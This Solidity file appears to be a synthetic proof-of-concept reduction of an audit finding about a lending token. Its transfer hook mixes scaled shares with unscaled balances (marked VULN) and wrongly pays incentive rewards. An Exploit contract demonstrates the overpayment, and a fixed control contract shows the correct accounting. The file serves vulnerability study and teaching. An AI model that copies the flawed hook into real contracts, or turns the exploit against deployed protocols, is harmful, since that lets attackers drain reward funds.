// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Cod3x Lend — scaled and unscaled amounts mixed in _afterTokenTransfer
    (Spearbit, finding 49180).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    ERC6909 passes `amount` in shares. balanceOf and totalSupply return
    shares times the index. The transfer hook adds and subtracts those
    different units, then the incentives controller pays the reported
    prior balance. With index 2, a 400-share transfer to an empty
    recipient reports a prior balance of 400 and pays 400. The fair
    scaled prior balance is 0. The control hook reads shares for every
    term, so the same transfer pays 0. The mixed lines are preserved
    verbatim (@> VULN). run() does not warp. */

contract RewardToken {
    string public name = "Incentive";
    string public symbol = "INC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    event Transfer(address indexed from, address indexed to, uint256 value);

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
}

contract Incentives {
    RewardToken public reward;
    uint256 public lastPaid;

    constructor(address reward_) {
        reward = RewardToken(reward_);
    }

    function handleAction(uint256, address user, uint256, uint256 oldBalance) external {
        lastPaid = oldBalance;
        if (oldBalance > 0) reward.mint(user, oldBalance);
    }
}

contract AToken {
    uint256 public constant INDEX = 2;
    Incentives public incentives;
    uint256 public scaledSupply;
    mapping(address => uint256) public scaledBalance;
    uint256 public reportedFrom;
    uint256 public reportedTo;

    constructor(address incentives_) {
        incentives = Incentives(incentives_);
    }

    function dealShares(address to, uint256 shares) external {
        scaledBalance[to] += shares;
        scaledSupply += shares;
    }

    function balanceOf(address account, uint256) public view returns (uint256) {
        return scaledBalance[account] * INDEX;
    }

    function totalSupply(uint256) public view returns (uint256) {
        return scaledSupply * INDEX;
    }

    function transfer(address to, uint256 id, uint256 amount) external {
        scaledBalance[msg.sender] -= amount;
        scaledBalance[to] += amount;
        _afterTokenTransfer(msg.sender, to, id, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 id, uint256 amount) internal {
        uint256 oldSupply = totalSupply(id); // not scaled
        uint256 oldFromBalance = balanceOf(from, id); // not scaled
        uint256 oldToBalance = balanceOf(to, id); // not scaled
        // @> VULN: amount is scaled shares and oldFromBalance is unscaled underlying
        oldFromBalance = oldFromBalance + amount; // mix: (not scaled) + (scaled)
        // @> VULN: unscaled recipient balance minus scaled shares
        oldToBalance = oldToBalance - amount; // mix: (not scaled) - (scaled)
        incentives.handleAction(id, from, oldSupply, oldFromBalance);
        reportedFrom = oldFromBalance;
        if (from != to) {
            incentives.handleAction(id, to, oldSupply, oldToBalance);
            reportedTo = oldToBalance;
        }
    }
}

contract FixedAToken {
    Incentives public incentives;
    uint256 public scaledSupply;
    mapping(address => uint256) public scaledBalance;
    uint256 public reportedFrom;
    uint256 public reportedTo;

    constructor(address incentives_) {
        incentives = Incentives(incentives_);
    }

    function dealShares(address to, uint256 shares) external {
        scaledBalance[to] += shares;
        scaledSupply += shares;
    }

    function transfer(address to, uint256 id, uint256 amount) external {
        scaledBalance[msg.sender] -= amount;
        scaledBalance[to] += amount;
        _afterTokenTransfer(msg.sender, to, id, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 id, uint256 amount) internal {
        uint256 oldSupply = scaledSupply;
        uint256 oldFromBalance = scaledBalance[from];
        uint256 oldToBalance = scaledBalance[to];
        oldFromBalance = oldFromBalance + amount;
        oldToBalance = oldToBalance - amount;
        incentives.handleAction(id, from, oldSupply, oldFromBalance);
        reportedFrom = oldFromBalance;
        if (from != to) {
            incentives.handleAction(id, to, oldSupply, oldToBalance);
            reportedTo = oldToBalance;
        }
    }
}

contract Exploit {
    address public constant BOB = 0x0000000000000000000000000000000000000B0b;
    uint256 public constant SHARES = 1000 ether;
    uint256 public constant MOVE = 400 ether;
    uint256 public constant ID = 1;

    RewardToken public reward; // CREATE nonce 1
    Incentives public incentives; // CREATE nonce 2
    AToken public atoken; // CREATE nonce 3
    FixedAToken public fixedToken; // CREATE nonce 4

    uint256 public buggyTo;
    uint256 public buggyFrom;
    uint256 public bobReward;
    uint256 public fairTo;
    uint256 public controlTo;
    uint256 public controlFrom;

    constructor() {
        reward = new RewardToken();
        incentives = new Incentives(address(reward));
        atoken = new AToken(address(incentives));
        fixedToken = new FixedAToken(address(incentives));
    }

    function run() external {
        atoken.dealShares(address(this), SHARES);
        atoken.transfer(BOB, ID, MOVE);

        buggyFrom = atoken.reportedFrom();
        buggyTo = atoken.reportedTo();
        bobReward = reward.balanceOf(BOB);
        fairTo = 0;
        require(buggyTo == MOVE, "recipient prior balance was not the mixed 400");
        require(buggyFrom == (SHARES - MOVE) * 2 + MOVE, "sender mix was not 1600");
        require(bobReward == MOVE, "Bob was not paid 400");
        require(fairTo == 0, "fair recipient prior balance is not 0");

        fixedToken.dealShares(address(this), SHARES);
        fixedToken.transfer(BOB, ID, MOVE);

        controlTo = fixedToken.reportedTo();
        controlFrom = fixedToken.reportedFrom();
        require(controlTo == 0, "control paid the recipient");
        require(controlFrom == SHARES, "control did not report the scaled 1000");
        require(reward.balanceOf(BOB) == MOVE, "control minted a second reward");
    }
}
